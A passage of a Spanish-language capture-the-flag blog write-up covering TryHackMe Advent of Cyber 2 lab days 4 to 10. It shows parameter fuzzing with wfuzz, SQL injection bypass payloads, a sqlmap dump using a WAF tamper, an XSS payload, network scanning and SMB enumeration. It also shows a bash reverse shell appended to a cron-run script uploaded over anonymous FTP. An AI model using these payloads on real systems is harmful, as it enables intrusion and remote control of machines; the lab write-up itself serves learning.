			<span class="n">m</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">if</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
			<span class="n">d</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>			
			
			<span class="k">print</span><span class="p">(</span><span class="n">y</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
	<span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
	<span class="n">j</span><span class="o">+=</span><span class="mi">1</span>
	<span class="n">k</span><span class="o">+=</span><span class="mi">1</span>
<span class="c1"># python dates.py &gt; dates.txt</span>
</code></pre></td></tr></table>
</div>
</div><p>Utilizamos <code>WFUZZ</code> para pasarle los valores del diccionario al parametro <code>date</code> y ocultamos todas las solicitudes que tuvieran 0 caracteres (<code>--hh 0</code>), logrando obtener la fecha en donde se presenta nuestra flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ wfuzz -c -z file,dates.txt --hh <span class="m">0</span> http://10.10.57.57/api/site-log.php?date<span class="o">=</span>FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.57.57/api/site-log.php?date<span class="o">=</span>FUZZ
Total requests: <span class="nv">11532</span>

<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       <span class="nv">Payload</span>                                                                                                                     
<span class="o">===================================================================</span>

000011495:   <span class="m">200</span>        <span class="m">0</span> L      <span class="m">1</span> W      <span class="m">13</span> Ch      <span class="s2">&#34;20201125&#34;</span>                                                                                                                  

Total time: 419.2043
Processed Requests: <span class="m">11532</span>
Filtered Requests: <span class="m">11531</span>
Requests/sec.: 27.50925
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201212_130921.png" alt="image" /></p>
<h1 id="day-5---web-exploitation-">DAY 5 - Web Exploitation</h1>
<p>Se presenta una aplicacion web vulnerable a SQLi de la cual nos dan la &ldquo;documentacion&rdquo;:</p>
<p><em>Santa&rsquo;s TODO: Look at alternative database systems that are better than sqlite. Also, don&rsquo;t forget that you installed a Web Application Firewall (WAF) after last year&rsquo;s attack. In case you&rsquo;ve forgotten the command, you can tell SQLMap to try and bypass the WAF by using &ndash;tamper=space2comment</em></p>
<p>En la primera tarea preguntan por el panel de logeo, la pista dada es suficiente para obtener la respuesta. En el panel realizamos &ldquo;bypass&rdquo; utilizando el payload <code>' or true; --</code> en el campo de <strong>username</strong>.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_083202.png" alt="image" /></p>
<p>Dentro de la aplicacion enviamos el payload <code>' ORDER BY 1--</code> el cual hizo retornar los valores de la base de datos.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_083815.png" alt="image" /></p>
<p>Utilizando SQLMAP y Burpsuite para obtener los datos de la base de datos tal y como se explica en la descripcion del reto de este dia, tomando en cuenta que la aplicacion cuenta con un WAF utilizamos un tamper para &ldquo;camuflar&rdquo; los payloads y como base de datos se especifica que es <strong>sqlite</strong> como lo indica la &ldquo;documentacion&rdquo;.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#sqlmap -r santaspanel.txt --dbms=sqlite --tamper=space2comment --dump-all</span>

Database: SQLite_masterdb
Table: users
<span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+------------------+----------+
<span class="p">|</span> password         <span class="p">|</span> username <span class="p">|</span>
+------------------+----------+
<span class="p">|</span> EhCNSWzzFP6sc7gB <span class="p">|</span> admin    <span class="p">|</span>
+------------------+----------+

Database: SQLite_masterdb
Table: sequels
<span class="o">[</span><span class="m">22</span> entries<span class="o">]</span>
+-------------+-----+----------------------------+
<span class="p">|</span> kid         <span class="p">|</span> age <span class="p">|</span> title                      <span class="p">|</span>
+-------------+-----+----------------------------+
<span class="p">|</span> James       <span class="p">|</span> <span class="m">8</span>   <span class="p">|</span> shoes                      <span class="p">|</span>
<span class="p">|</span> John        <span class="p">|</span> <span class="m">4</span>   <span class="p">|</span> skateboard                 <span class="p">|</span>
<span class="p">|</span> Robert      <span class="p">|</span> <span class="m">17</span>  <span class="p">|</span> iphone                     <span class="p">|</span>
<span class="p">|</span> Michael     <span class="p">|</span> <span class="m">5</span>   <span class="p">|</span> playstation                <span class="p">|</span>
<span class="p">|</span> William     <span class="p">|</span> <span class="m">6</span>   <span class="p">|</span> xbox                       <span class="p">|</span>
<span class="p">|</span> David       <span class="p">|</span> <span class="m">6</span>   <span class="p">|</span> candy                      <span class="p">|</span>
<span class="p">|</span> Richard     <span class="p">|</span> <span class="m">9</span>   <span class="p">|</span> books                      <span class="p">|</span>
<span class="p">|</span> Joseph      <span class="p">|</span> <span class="m">7</span>   <span class="p">|</span> socks                      <span class="p">|</span>
<span class="p">|</span> Thomas      <span class="p">|</span> <span class="m">10</span>  <span class="p">|</span> <span class="m">10</span> McDonalds meals         <span class="p">|</span>
<span class="p">|</span> Charles     <span class="p">|</span> <span class="m">3</span>   <span class="p">|</span> toy car                    <span class="p">|</span>
<span class="p">|</span> Christopher <span class="p">|</span> <span class="m">8</span>   <span class="p">|</span> air hockey table           <span class="p">|</span>
<span class="p">|</span> Daniel      <span class="p">|</span> <span class="m">12</span>  <span class="p">|</span> lego star wars             <span class="p">|</span>
<span class="p">|</span> Matthew     <span class="p">|</span> <span class="m">15</span>  <span class="p">|</span> bike                       <span class="p">|</span>
<span class="p">|</span> Anthony     <span class="p">|</span> <span class="m">3</span>   <span class="p">|</span> table tennis               <span class="p">|</span>
<span class="p">|</span> Donald      <span class="p">|</span> <span class="m">4</span>   <span class="p">|</span> fazer chocolate            <span class="p">|</span>
<span class="p">|</span> Mark        <span class="p">|</span> <span class="m">17</span>  <span class="p">|</span> wii                        <span class="p">|</span>
<span class="p">|</span> Paul        <span class="p">|</span> <span class="m">9</span>   <span class="p">|</span> github ownership           <span class="p">|</span>
<span class="p">|</span> James       <span class="p">|</span> <span class="m">8</span>   <span class="p">|</span> finnish-english dictionary <span class="p">|</span>
<span class="p">|</span> Steven      <span class="p">|</span> <span class="m">11</span>  <span class="p">|</span> laptop                     <span class="p">|</span>
<span class="p">|</span> Andrew      <span class="p">|</span> <span class="m">16</span>  <span class="p">|</span> rasberry pie               <span class="p">|</span>
<span class="p">|</span> Kenneth     <span class="p">|</span> <span class="m">19</span>  <span class="p">|</span> TryHackMe Sub              <span class="p">|</span>
<span class="p">|</span> Joshua      <span class="p">|</span> <span class="m">12</span>  <span class="p">|</span> chair                      <span class="p">|</span>
+-------------+-----+----------------------------+

Database: SQLite_masterdb
Table: hidden_table
<span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+-----------------------------------------+
<span class="p">|</span> flag                                    <span class="p">|</span>
+-----------------------------------------+
<span class="p">|</span> thmfox<span class="o">{</span>All_I_Want_for_Christmas_Is_You<span class="o">}</span> <span class="p">|</span>
+-----------------------------------------+
</code></pre></td></tr></table>
</div>
</div><h1 id="day-6---web-exploitation-">DAY 6 - Web Exploitation</h1>
<p>La aplicacion dada es vulnerable a XSS y utilizando OWASP ZAP es posible obtener las diferentes alertas de XSS. Para responder las preguntas de este reto es necesario explotar el campo <code>New Book...</code> y utilizar OWASP ZAP.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshot_20201214_091319.png" alt="image" /><br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_091924.png" alt="image" /></p>
<h1 id="day-7---networking-">DAY 7 - Networking</h1>
<p>Se un archivo comprimido con varios archivos de captura de paquetes a los cuales hay que realizar un analisis utilizando wireshark y los filtros descritos y explicados en la descripcion del reto del dia.</p>
<ul>
<li>
<p>La IP que realiza ping (archivo: pcap1.pcap).<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_094458.png" alt="image" /></p>
</li>
<li>
<p>Post Visitado por la ip <strong>10.10.67.199</strong> utilizando el filtro <code>http.request.method == GET</code>, tambien se puede incluir la ip en el filtro <code>http.request.method == GET &amp;&amp; ip.src == 10.10.67.199</code> (archivo: pcap1.pcap).<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_094754.png" alt="image" /></p>
</li>
<li>
<p>Utilizando el filtro <code>tcp.port==21</code> para las peticiones en el puerto 21 de FTP y leer la contraseña (archivo: pcap2.pcap).<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_095328.png" alt="image" /></p>
</li>
<li>
<p>Protocolo encriptado: <code>SSH</code> (archivo: pcap2.pcap).</p>
</li>
<li>
<p>Que hay en la lista de deseos de <strong>Elf McSkidy</strong>, exportando los archivos (objetos) en el protocolo HTTP (archivo: pcap3.pcap).<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_095903.png" alt="image" /></p>
</li>
</ul>
<h1 id="day-8---networking-">DAY 8 - Networking</h1>
<p>Se presenta una IP en la cual hay que realizar un escaneo de puertos, sistema operativo y ejecutar scripts con nmap. Tambien una serie de preguntas relacionada a sintaxis e informacion obtenida.</p>
<ul>
<li>
<p>Creacion de Snort: <a href="https://es.wikipedia.org/wiki/Snort"><strong>Snort</strong></a></p>
</li>
<li>
<p>Puertos abiertos con un simple scan.</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#nmap tbfc.blog</span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 11:07 EST
Nmap scan report <span class="k">for</span> tbfc.blog <span class="o">(</span>10.10.1.235<span class="o">)</span>
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3389/tcp open  ms-wbt-server

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.97 seconds
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>Determinar el Sistema operativo: <code>nmap -O tbfc.blog</code></p>
</li>
<li>
<p>Determinar para que esta oreintada la Aplicacion web con el script <code>http-title</code>: blog.</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ nmap --script http-title -p <span class="m">80</span> tbfc.blog
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 11:12 EST
Nmap scan report <span class="k">for</span> tbfc.blog <span class="o">(</span>10.10.1.235<span class="o">)</span>
Host is up <span class="o">(</span>0.79s latency<span class="o">)</span>.

PORT   STATE SERVICE
80/tcp open  http
<span class="p">|</span>_http-title: TBFC<span class="p">&amp;</span><span class="c1">#39;s Internal Blog</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 3.74 seconds
</code></pre></td></tr></table>
</div>
</div><h1 id="day-9---networking-">DAY 9 - Networking</h1>
<p>Un servicio FTP esta expuesto en la IP del reto en la cual se ingresa como <strong>&ldquo;anonymous&rdquo;</strong>, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas y obtener la flag. En la primera pestaña tenemos la conexion con el servicio donde logramos obtener el archivo <code>backup.sh</code> y <code>shoppinglist.txt</code>, el archivo backup se ejecuta cada cierto tiempo, agregamos una shell inversa y volvimos a subir el archivo en el servicio FTP, con netcat a la escucha logramos obtener una shell y nuestra flag <code>root.txt</code>.</p>

<div id="8cffdf025cd0db84" class="codetab">
  <div class="codetab__links">
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
  </div>
  

  
<div id="131d7a836d59abfd" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ ftp 10.10.99.86
Connected to 10.10.99.86.
<span class="m">220</span> Welcome to the TBFC FTP Server!.
Name <span class="o">(</span>10.10.99.86:kali<span class="o">)</span>: anonymous
<span class="m">230</span> Login successful.
Remote system <span class="nb">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -lah
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="m">6</span> <span class="m">65534</span>    <span class="m">65534</span>        <span class="m">4096</span> Nov <span class="m">16</span> 15:06 .
drwxr-xr-x    <span class="m">6</span> <span class="m">65534</span>    <span class="m">65534</span>        <span class="m">4096</span> Nov <span class="m">16</span> 15:06 ..
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Nov <span class="m">16</span> 15:04 backups
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Nov <span class="m">16</span> 15:05 elf_workshops
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Nov <span class="m">16</span> 15:04 human_resources
drwxrwxrwx    <span class="m">2</span> <span class="m">65534</span>    <span class="m">65534</span>        <span class="m">4096</span> Nov <span class="m">16</span> 19:35 public
<span class="m">226</span> Directory send OK.
ftp&gt; <span class="nb">cd</span> public
<span class="m">250</span> Directory successfully changed.
ftp&gt; ls -lah
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
drwxrwxrwx    <span class="m">2</span> <span class="m">65534</span>    <span class="m">65534</span>        <span class="m">4096</span> Nov <span class="m">16</span> 19:35 .
drwxr-xr-x    <span class="m">6</span> <span class="m">65534</span>    <span class="m">65534</span>        <span class="m">4096</span> Nov <span class="m">16</span> 15:06 ..
-rwxr-xr-x    <span class="m">1</span> <span class="m">111</span>      <span class="m">113</span>           <span class="m">341</span> Nov <span class="m">16</span> 19:34 backup.sh
-rw-rw-rw-    <span class="m">1</span> <span class="m">111</span>      <span class="m">113</span>            <span class="m">24</span> Nov <span class="m">16</span> 19:35 shoppinglist.txt
<span class="m">226</span> Directory send OK.
ftp&gt; get backup.sh
local: backup.sh remote: backup.sh
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> backup.sh <span class="o">(</span><span class="m">341</span> bytes<span class="o">)</span>.
<span class="m">226</span> Transfer complete.
<span class="m">341</span> bytes received in 0.00 secs <span class="o">(</span>660.7298 kB/s<span class="o">)</span>
ftp&gt; get shoppinglist.txt
local: shoppinglist.txt remote: shoppinglist.txt
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> shoppinglist.txt <span class="o">(</span><span class="m">24</span> bytes<span class="o">)</span>.
<span class="m">226</span> Transfer complete.
<span class="m">24</span> bytes received in 0.00 secs <span class="o">(</span>181.6861 kB/s<span class="o">)</span>
ftp&gt; put backup.sh
local: backup.sh remote: backup.sh
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Ok to send data.
<span class="m">226</span> Transfer complete.
<span class="m">383</span> bytes sent in 0.00 secs <span class="o">(</span>1.6603 MB/s<span class="o">)</span>
ftp&gt; 
</code></pre></td></tr></table>
</div>
</div>
</div>

  
<div id="9965c65535b08dfb" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ cat backup.sh 
<span class="c1">#!/bin/bash</span>

<span class="c1"># Created by ElfMcEager to backup all of Santa&#39;s goodies!</span>

<span class="c1"># Create backups to include date DD/MM/YYYY</span>
<span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz&#34;</span><span class="p">;</span>

<span class="c1"># Backup FTP folder and store in elfmceager&#39;s home directory</span>
tar -zcvf /home/elfmceager/<span class="nv">$filename</span> /opt/ftp

<span class="c1"># TO-DO: Automate transfer of backups to backup server</span>


kali@kali:~/thm/adventcyber2$ cat shoppinglist.txt 
The Polar Express Movie
kali@kali:~/thm/adventcyber2$ <span class="nb">echo</span> <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1338 0&gt;&amp;1&#34;</span> &gt;&gt; backup.sh 
kali@kali:~/thm/adventcyber2$ tail backup.sh 
<span class="c1"># Create backups to include date DD/MM/YYYY</span>
<span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz&#34;</span><span class="p">;</span>

<span class="c1"># Backup FTP folder and store in elfmceager&#39;s home directory</span>
tar -zcvf /home/elfmceager/<span class="nv">$filename</span> /opt/ftp

<span class="c1"># TO-DO: Automate transfer of backups to backup server</span>


bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.10.10/1338 0&gt;<span class="p">&amp;</span><span class="m">1</span>
kali@kali:~/thm/adventcyber2$
</code></pre></td></tr></table>
</div>
</div>
</div>


</div>

<script>
  'use strict';

  var containerId = JSON.parse("\"8cffdf025cd0db84\"");
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll('.codetab__link');
    codetabContents = containerElem.querySelectorAll('.codetab__content');
  }

  for (var i = 0; i < codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute('id'));
    codetabContents[i].style.display = 'none';

    if (0 === parseInt(i, 10) && !codetabContents[i].classList.contains('active')) {
      codetabContents[i].classList.add('active');
    }
  }

  for (var i = 0; i < codetabLinks.length; i++) {
    codetabLinks[i].setAttribute('id', ids[i]);

    if (0 === parseInt(i, 10) && !codetabLinks[i].classList.contains('active')) {
      codetabLinks[i].classList.add('active');
    } else {
      codetabLinks[i].classList.remove('active');
    }
  }

  if (codetabContents.length > 0) {
    codetabContents[0].style.display = 'block';
  }
</script>
<p><img src="/images/posts/thm/aoc2/Screenshot_20201214_102943.png" alt="image" /></p>
<h1 id="day-10---networking-">DAY 10 - Networking</h1>
<p>Un servicio SAMBA esta expuesto en la IP del reto, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas con las herramientas <code>enum4linux</code> y <code>smbclient</code>. Se realiza un escaneo con enum4linux para busqueda de nombres de usuarios y SHARENAMES con los cuales verificamos en cual de estos SHARENAMES permite entrar sin ninguna credencial.</p>

<div id="521f83c69789640e" class="codetab">
  <div class="codetab__links">
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
      <button class="codetab__link" aria-label="Tab link">bash</button>
    
  </div>
  
  
<div id="6504ed350813d4f6" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ enum4linux -S -U 10.10.77.26 2&gt;/dev/null
Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Mon Dec <span class="m">14</span> 11:45:44 <span class="m">2020</span>

<span class="o">[</span>... snip ...<span class="o">]</span>

 <span class="o">==========================================</span> 
<span class="p">|</span>    Getting domain SID <span class="k">for</span> 10.10.77.26    <span class="p">|</span>
 <span class="o">==========================================</span> 
Domain Name: TBFC-SMB-01
Domain Sid: <span class="o">(</span>NULL SID<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> Can<span class="s1">&#39;t determine if host is part of domain or part of a workgroup
</span><span class="s1">
</span><span class="s1"> ============================ 
</span><span class="s1">|    Users on 10.10.77.26    |
</span><span class="s1"> ============================ 
</span><span class="s1">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy Name:   Desc: 
</span><span class="s1">index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager Name: elfmceager  Desc: 
</span><span class="s1">index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson  Name:   Desc: 
</span><span class="s1">
</span><span class="s1">user:[elfmcskidy] rid:[0x3e8]
</span><span class="s1">user:[elfmceager] rid:[0x3ea]
</span><span class="s1">user:[elfmcelferson] rid:[0x3e9]
</span><span class="s1">
</span><span class="s1"> ======================================== 
</span><span class="s1">|    Share Enumeration on 10.10.77.26    |
</span><span class="s1"> ======================================== 
</span><span class="s1">
</span><span class="s1">  Sharename       Type      Comment
</span><span class="s1">  ---------       ----      -------
</span><span class="s1">  tbfc-hr         Disk      tbfc-hr
</span><span class="s1">  tbfc-it         Disk      tbfc-it
</span><span class="s1">  tbfc-santa      Disk      tbfc-santa
</span><span class="s1">  IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
</span><span class="s1">SMB1 disabled -- no workgroup available
</span><span class="s1">
</span><span class="s1">[+] Attempting to map shares on 10.10.77.26
</span><span class="s1">//10.10.77.26/tbfc-hr Mapping: DENIED, Listing: N/A
</span><span class="s1">//10.10.77.26/tbfc-it Mapping: DENIED, Listing: N/A
</span><span class="s1">//10.10.77.26/tbfc-santa  Mapping: OK, Listing: OK
</span><span class="s1">//10.10.77.26/IPC$  [E] Can&#39;</span>t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>
enum4linux <span class="nb">complete</span> on Mon Dec <span class="m">14</span> 11:46:32 <span class="m">2020</span>
</code></pre></td></tr></table>
</div>
</div>
</div>

  
<div id="cfe55eeceaf224e6" class="codetab__content">
  <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ smbclient <span class="se">\\\\</span>10.10.77.26<span class="se">\\</span>tbfc-hr
Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">&#39;s password: 
</span><span class="s1">tree connect failed: NT_STATUS_ACCESS_DENIED
</span><span class="s1">kali@kali:~/thm/adventcyber2$ smbclient \\\\10.10.77.26\\tbfc-it
